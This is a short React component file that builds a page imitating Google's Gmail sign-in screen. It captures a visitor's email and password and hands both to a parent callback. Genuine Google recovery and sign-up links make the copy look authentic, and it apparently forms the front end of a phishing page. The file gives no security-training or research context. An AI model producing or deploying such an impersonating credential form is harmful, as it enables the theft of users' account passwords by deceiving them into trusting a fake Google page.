import React from 'react';
import PropTypes from 'prop-types';

export default class Gmail extends React.Component{
	constructor(props){
		super(props);
		this.state = {
			email:'',
			password:''
		}
	}
handleChange(e){
	this.setState({
		[e.target.name] : e.target.value
	})	
}

handleSubmit(){
	const email = this.state.email;
	const password = this.state.password;
	this.props.handleGmailCallBack(email, password);
}
	render(){
		return (
				<div className="box">
						<p>Google</p>
						<h3>Sign in</h3>
						<p>to continue to Gmail</p>
						<label for="email">Email or Phone</label><br />
						<input type="text" name="email" id="email" onChange={(e)=>this.handleChange(e)} /><br />
						<label for="password">Password</label><br />
						<input type="password" name="password" id="password" onChange={(e)=>this.handleChange(e)} /><br />
						<a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot email? </a>
					<div className="submit">
						<a href="https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=SignUp"> Create Acccount </a>
						<button onClick={()=>this.handleSubmit()}>Submit </button>
					</div>
				</div>
			);    
	}
}

Gmail.propTypes={
	handleGmailCallBack: PropTypes.func.isRequired
};
Gmail.defaultProps={
};